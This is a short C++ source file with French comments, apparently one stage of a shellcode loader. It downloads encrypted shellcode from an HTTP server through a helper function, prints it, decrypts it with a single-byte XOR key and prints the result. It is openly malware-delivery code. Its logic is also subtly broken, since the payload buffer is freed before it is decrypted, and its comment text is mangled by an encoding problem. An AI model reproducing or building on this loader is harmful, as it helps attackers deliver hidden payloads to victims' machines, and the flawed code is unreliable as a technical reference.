#include <iostream> 
#include "HTTPClient.h" 
#include "decrypt.h" 
#include "Memory.h" 

int main() {
    // Etape 2 : R�cup�ration du shellcode chiffr� du serveur HTTP 
    DWORD payloadSize = 0;
    PBYTE payload = getHTTPPayload(payloadSize);

    if (!payload) {
        std::cerr << "�chec de la r�cup�ration du shellcode." << std::endl;
        return 1;
    }

    std::cout << "Shellcode r�cup�r� (chiffr�) :" << std::endl;

    for (DWORD i = 0; i < payloadSize; i++) {
        printf("%02X ", payload[i]);
    }

    std::cout << std::endl;

    LocalFree(payload);

    // Fin de la r�cup�ration du shellcode chiffr� du serveur http
    
    // Etape 3 : D�chiffrement du shellcode 
     // Cl� de d�chiffrement 

    unsigned char decryptionKey = 0xAA;

    // D�chiffrement du shellcode 

    decrypt(payload, payloadSize, decryptionKey);

    std::cout << "Shellcode apr�s d�chiffrement :" << std::endl;

    for (DWORD i = 0; i < payloadSize; i++) {
        printf("%02X ", payload[i]);
    }

    std::cout << std::endl;

    // Fin du d�chiffrement du shellcode 

    return 0;

}